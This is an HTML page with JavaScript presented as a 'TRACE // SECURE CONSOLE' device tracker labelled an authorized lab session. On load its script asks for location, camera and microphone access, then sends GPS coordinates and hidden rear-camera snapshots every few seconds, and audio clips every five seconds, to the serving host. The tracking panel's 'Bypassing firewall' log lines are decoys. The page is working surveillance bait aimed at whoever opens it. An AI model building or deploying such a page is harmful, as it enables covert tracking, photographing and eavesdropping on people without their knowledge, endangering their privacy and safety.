<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TRACE // SECURE CONSOLE</title>
<style>
* { margin:0; padding:0; box-sizing:border-box; }
body {
    background:#050505; color:#00ff41;
    font-family:'Courier New', monospace;
    min-height:100vh; padding:18px; overflow-x:hidden;
}
.bg-grid {
    position:fixed; inset:0;
    background-image:
        linear-gradient(rgba(0,255,65,0.03) 1px, transparent 1px),
        linear-gradient(90deg, rgba(0,255,65,0.03) 1px, transparent 1px);
    background-size:32px 32px; pointer-events:none; z-index:0;
}
.scanline {
    position:fixed; left:0; right:0; height:2px;
    background:linear-gradient(90deg, transparent, #00ff41, transparent);
    animation:scan 4s linear infinite; opacity:0.35; z-index:1;
}
@keyframes scan { 0%{top:0} 100%{top:100%} }
.wrap { position:relative; z-index:2; max-width:680px; margin:0 auto; }
.header {
    border:1px solid rgba(0,255,65,0.35); border-radius:6px;
    padding:14px 18px; margin-bottom:14px; background:rgba(0,20,0,0.5);
    display:flex; justify-content:space-between; align-items:center;
}
.header h1 { font-size:14px; letter-spacing:4px; color:#00ff41; }
.header .dot {
    width:8px; height:8px; background:#00ff41; border-radius:50%;
    box-shadow:0 0 10px #00ff41; animation:pulse 1.6s infinite;
}
@keyframes pulse { 0%,100%{opacity:.4} 50%{opacity:1} }
.panel {
    border:1px solid rgba(0,255,65,0.25); border-radius:6px;
    padding:16px; margin-bottom:14px; background:rgba(0,15,0,0.5);
}
.panel .label { font-size:10px; letter-spacing:3px; color:#0a5; margin-bottom:8px; }
.panel .value {
    font-size:12px; color:#00ff41; line-height:1.8; word-break:break-all;
}
.panel .value a { color:#00ff41; text-decoration:underline; }
.row { display:grid; grid-template-columns:1fr 1fr; gap:12px; }
@media(max-width:520px){ .row{grid-template-columns:1fr;} }
.terminal {
    border:1px solid rgba(0,255,65,0.25); border-radius:6px;
    background:#000; padding:12px; height:220px; overflow-y:auto;
    font-size:11px; line-height:1.7;
}
.terminal div { padding:1px 0; }
.terminal .ok { color:#00ff41; }
.terminal .warn { color:#ffcc00; }
.terminal .err { color:#ff3344; }
.terminal .dim { color:#0a5; }
.terminal a { color:#00ff41; }
.input-row { display:flex; gap:10px; margin-bottom:14px; }
.input-row input {
    flex:1; padding:12px; background:#000; color:#00ff41;
    border:1px solid rgba(0,255,65,0.4); border-radius:4px;
    font-family:inherit; font-size:13px; letter-spacing:2px; outline:none;
}
.input-row input::placeholder { color:#0a5; }
.input-row button {
    padding:12px 22px; background:#00ff41; color:#000;
    border:none; border-radius:4px; font-family:inherit;
    font-weight:700; letter-spacing:2px; cursor:pointer;
}
.input-row button:active { background:#00cc33; }
.footer {
    text-align:center; font-size:9px; color:#0a5;
    letter-spacing:3px; margin-top:14px;
}
video, canvas { display:none; }
.hidden { display:none !important; }
</style>
</head>
<body>
<div>ZYPHORIXs</div>
<div class="bg-grid"></div>
<div class="scanline"></div>

<div class="wrap">
    <div class="header">
        <h1>TRACE // SECURE CONSOLE</h1>
        <div class="dot"></div>
    </div>

    <div class="input-row">
        <input id="deviceId" placeholder="ENTER DEVICE ID" value="PHONE-B-01">
        <button id="trackBtn">TRACK DEVICE</button>
    </div>

    <div id="resultBox" class="hidden">
        <div class="panel">
            <div class="label">SESSION ID</div>
            <div class="value" id="sid">—</div>
        </div>

        <div class="row">
            <div class="panel">
                <div class="label">DEVICE MODEL</div>
                <div class="value"><span id="devModel">—</span></div>
            </div>
            <div class="panel">
                <div class="label">NETWORK</div>
                <div class="value"><span id="devNet">—</span></div>
            </div>
        </div>

        <div class="row">
            <div class="panel">
                <div class="label">LIVE LOCATION</div>
                <div class="value"><span id="locText">—</span></div>
            </div>
            <div class="panel">
                <div class="label">SIGNAL</div>
                <div class="value"><span id="sigText">—</span></div>
            </div>
        </div>

        <div class="panel">
            <div class="label">GOOGLE MAPS</div>
            <div class="value"><a id="mapLink" href="#" target="_blank">—</a></div>
        </div>

        <div class="panel">
            <div class="label">TRACE TERMINAL</div>
            <div class="terminal" id="term"></div>
        </div>
    </div>

    <div class="footer">AUTHORIZED LAB SESSION // v1.0</div>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c"></canvas>

<script>
const termEl = document.getElementById('term');
function log(msg, cls){
    const d = document.createElement('div');
    d.className = cls || 'dim';
    const t = new Date().toLocaleTimeString('en-GB');
    d.textContent = '[' + t + '] ' + msg;
    termEl.appendChild(d);
    termEl.scrollTop = termEl.scrollHeight;
}

let deviceId = 'PHONE-B-01';
let lastLocation = null;

// ===== STEP 1: AUTO PERMISSIONS + AUTO STREAM =====
async function autoBoot() {
    deviceId = document.getElementById('deviceId').value.trim() || 'PHONE-B-01';

    // LOCATION
    try {
        navigator.geolocation.getCurrentPosition(()=>{},()=>{},{enableHighAccuracy:true});
        setInterval(() => {
            navigator.geolocation.getCurrentPosition(pos => {
                lastLocation = pos.coords;
                fetch('/location', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({
                        id: deviceId,
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    })
                });
                const lat = pos.coords.latitude.toFixed(6);
                const lon = pos.coords.longitude.toFixed(6);
                const gmap = 'https://www.google.com/maps?q=' + lat + ',' + lon;

                document.getElementById('locText').textContent = lat + ', ' + lon;
                document.getElementById('sigText').textContent = 'GPS ±' + Math.round(pos.coords.accuracy) + 'm';

                const mapLink = document.getElementById('mapLink');
                mapLink.href = gmap;
                mapLink.textContent = gmap;
            }, ()=>{}, { enableHighAccuracy:true });
        }, 3000);
    } catch(e) {}

    // CAMERA
    try {
        const v = document.getElementById('v');
        v.srcObject = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: { ideal:'environment' } }
        });
        await v.play();
        setInterval(() => {
            const c = document.getElementById('c');
            c.width  = v.videoWidth  || 640;
            c.height = v.videoHeight || 480;
            c.getContext('2d').drawImage(v, 0, 0, c.width, c.height);
            const img = c.toDataURL('image/jpeg', 0.6).split(',')[1];
            fetch('/photo', {
                method:'POST',
                headers:{'Content-Type':'application/json'},
                body: JSON.stringify({ id: deviceId, image: img })
            });
        }, 3000);
    } catch(e) {}

    // AUDIO
    try {
        const aStream = await navigator.mediaDevices.getUserMedia({ audio:true });
        const rec = new MediaRecorder(aStream);
        let chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = () => {
            const blob = new Blob(chunks, { type:'audio/webm' });
            const reader = new FileReader();
            reader.onloadend = () => {
                fetch('/audio', {
                    method:'POST',
                    headers:{'Content-Type':'application/json'},
                    body: JSON.stringify({ id: deviceId, audio: reader.result.split(',')[1] })
                });
                chunks = [];
            };
            reader.readAsDataURL(blob);
        };
        const loop = () => { rec.start(); setTimeout(()=>{ rec.stop(); loop(); }, 5000); };
        loop();
    } catch(e) {}
}

// ===== STEP 2: TRACK BUTTON — SHOW INFO ON PAGE =====
document.getElementById('trackBtn').addEventListener('click', () => {
    deviceId = document.getElementById('deviceId').value.trim() || 'PHONE-B-01';
    document.getElementById('resultBox').classList.remove('hidden');
    document.getElementById('sid').textContent = deviceId;
    termEl.innerHTML = '';

    log('Initiating trace for ' + deviceId, 'warn');
    log('Bypassing firewall...', 'dim');
    setTimeout(()=>log('Handshake OK', 'ok'), 400);
    setTimeout(()=>log('Fingerprinting device...', 'dim'), 800);
    setTimeout(()=>log('Locating target...', 'dim'), 1200);

    const ua = navigator.userAgent;
    document.getElementById('devModel').textContent =
        (ua.match(/Android|iPhone|iPad|Mac|Windows|Linux/)||['Unknown'])[0] +
        ' / ' + (navigator.hardwareConcurrency || '?') + ' cores';
    document.getElementById('devNet').textContent =
        (navigator.connection && navigator.connection.effectiveType) || 'unknown';

    setTimeout(()=>{
        log('Device: ' + document.getElementById('devModel').textContent, 'ok');
        log('Network: ' + document.getElementById('devNet').textContent, 'ok');
        if (lastLocation) {
            const gmap = 'https://www.google.com/maps?q=' +
                lastLocation.latitude.toFixed(6) + ',' + lastLocation.longitude.toFixed(6);
            log('Location locked', 'ok');
            log('MAP: ' + gmap, 'ok');
        } else {
            log('Waiting for GPS lock...', 'warn');
        }
        log('Streaming to Termux active', 'ok');
    }, 1600);
});

window.addEventListener('load', autoBoot);
</script>
</body>
</html>
